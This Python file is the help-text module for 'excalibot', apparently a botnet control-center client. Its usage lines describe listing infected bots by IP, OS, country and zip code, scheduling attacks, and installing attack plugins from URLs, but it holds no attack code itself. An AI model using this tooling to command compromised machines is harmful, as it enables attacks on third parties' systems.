#!/usr/bin/env python


class Help:
    @staticmethod
    def help():
        print('Usage: excalibot help COMMAND')
        print('General application usage: excalibot COMMAND HOST PORT PARAMETERS')
        print('COMMAND:')
        print('  help\t\tPrint this information')
        print('  bot_list\t\tList available bots')
        print('  task_submit\tSchedule new attacks')
        print('  task_list\tList running tasks')
        print('  task_status\tCheck task completion status')
        print('  task_output\tPrint completed task output')
        print('  task_clear\t\tClear task from control center')
        print('  plugin_install\t\tInstall new plugin')
        print('  plugin_list\t\tList installed plugins')
        print('  plugin_clear\t\tClear installed plugin')
        print('  plugin_help\t\tGet help for installed plugin')

    @staticmethod
    def bot_list():
        print('List available bots')
        print('Usage: excalibot bot_list HOST PORT key:KEY since:SINCE')
        print('KEY: (optional)')
        print('  id\t\tSort list by botid')
        print('  ipAddress\tSort list by IP address')
        print('  lastSeen\tSort list by seconds since last report')
        print('  os\t\tSort list by Operative System')
        print('  countryCode\tSort list by Country')
        print('  zip\t\tSort list by zip code')
        print('SINCE: (optional)')
        print('  Show only bots alive in the last SINCE seconds')

    @staticmethod
    def task_submit():
        print('Schedule new tasks')
        print('Usage: excalibot task_submit HOST PORT ATTACK KEY:VALUE')
        print('ATTACK:')
        print('  installed plugin name')
        print('KEY:VALUE: (optional)')
        print('  list of parameters to the attack, in a key:value format')
        # TODO plugin_help

    @staticmethod
    def task_list():
        print('Print list of ongoing tasks')
        print('Usage: excalibot task_list HOST PORT')

    @staticmethod
    def task_status():
        print('Check task completion status')
        print('Usage: excalibot task_status HOST PORT ID block')
        print('ID:')
        print('  id of the task to get status')
        print('block: (optional)')
        print('  block until task is completed')

    @staticmethod
    def task_output():
        print('Print task output')
        print('Usage: excalibot task_output HOST PORT ID')
        print('ID:')
        print('  id of the task to get output')

    @staticmethod
    def task_clear():
        print('Clear task from control center')
        print('Usage: excalibot task_clear HOST PORT ID')
        print('ID:')
        print('  id of the task to deleted')

    @staticmethod
    def plugin_install():
        print('Install new plugin')
        print('Usage: excalibot plugin_install HOST PORT name:NAME url:URL')
        print('NAME:')
        print('  name of the plugin ')
        print('URL:')
        print('  url to the plugin resource')

    @staticmethod
    def plugin_list():
        print('Print list of available plugins')
        print('Usage: excalibot plugin_list HOST PORT')

    @staticmethod
    def plugin_clear():
        print('Clear plugin from control center')
        print('Usage: excalibot task_clear HOST PORT NAME')
        print('NAME:')
        print('  name of the plugin to deleted')

    @staticmethod
    def plugin_help():
        print('Get help for installed plugin')
        print('Usage: excalibot plugin_help HOST PORT NAME')
        print('NAME:')
        print('  name of the plugin to get help')